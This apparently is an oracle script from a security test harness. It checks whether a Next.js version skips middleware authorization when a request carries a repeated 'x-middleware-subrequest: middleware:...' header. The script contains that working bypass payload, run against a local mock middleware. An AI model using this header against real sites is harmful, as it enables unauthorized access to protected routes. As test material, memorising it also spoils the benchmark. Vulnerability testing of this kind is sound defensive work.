const fs = require('node:fs');
const path = require('node:path');
const os = require('node:os');

let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

function done() {
  console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));
}

(async () => {
  try {
    let NextRequest;
    let adapter;
    try {
      NextRequest = require('next/dist/server/web/spec-extension/request').NextRequest;
      adapter = require('next/dist/server/web/adapter').adapter;
    } catch (e) {
      evidence = 'module_resolution_failed:' + (e && e.message ? e.message : String(e));
      return done();
    }

    if (typeof NextRequest !== 'function' || typeof adapter !== 'function') {
      evidence = 'missing_required_exports';
      return done();
    }

    const marker = 'next-authz-oracle-' + Date.now() + '-' + Math.random().toString(16).slice(2);
    const tmpBase = path.join(os.tmpdir(), marker);
    fs.mkdirSync(tmpBase, { recursive: true });

    const pageModule = {
      default: function middleware(req) {
        const p = req.nextUrl.pathname;
        if (p.startsWith('/protected')) {
          return Response.redirect(new URL('/login', req.url), 307);
        }
        return new Response('ok', { status: 200 });
      },
      config: { matcher: ['/protected/:path*'] }
    };

    async function runOnce(pathname, subrequestHeader) {
      const headers = new Headers();
      if (subrequestHeader) headers.set('x-middleware-subrequest', subrequestHeader);
      const req = new NextRequest('https://example.test' + pathname, { method: 'GET', headers });

      return adapter({
        page: '/middleware',
        request: req,
        handler: pageModule.default
      });
    }

    let benignRes;
    try {
      benignRes = await runOnce('/protected/area', null);
    } catch (e) {
      evidence = 'benign_exception:' + (e && e.message ? e.message : String(e));
      return done();
    }

    const benignLoc = benignRes && benignRes.response && benignRes.response.headers && benignRes.response.headers.get
      ? benignRes.response.headers.get('location')
      : null;

    if (!benignLoc || benignLoc.indexOf('/login') === -1) {
      evidence = 'benign_failed:no_redirect';
      return done();
    }

    operation_completed = true;

    try {
      const maliciousHeader = 'middleware:middleware:middleware:middleware:middleware';
      const attackRes = await runOnce('/protected/area', maliciousHeader);
      const attackLoc = attackRes && attackRes.response && attackRes.response.headers && attackRes.response.headers.get
        ? attackRes.response.headers.get('location')
        : null;

      exploit_succeeded = !attackLoc;
      evidence = 'benign_redirect=1|attack_redirect=' + (attackLoc ? 1 : 0) + '|header=' + maliciousHeader + '|tmp=' + tmpBase;
    } catch (e) {
      exploit_succeeded = false;
      evidence = 'malicious_blocked_exception:' + (e && e.message ? e.message : String(e));
    }

    return done();
  } catch (e) {
    operation_completed = false;
    exploit_succeeded = false;
    evidence = 'unrelated_exception:' + (e && e.message ? e.message : String(e));
    return done();
  }
})();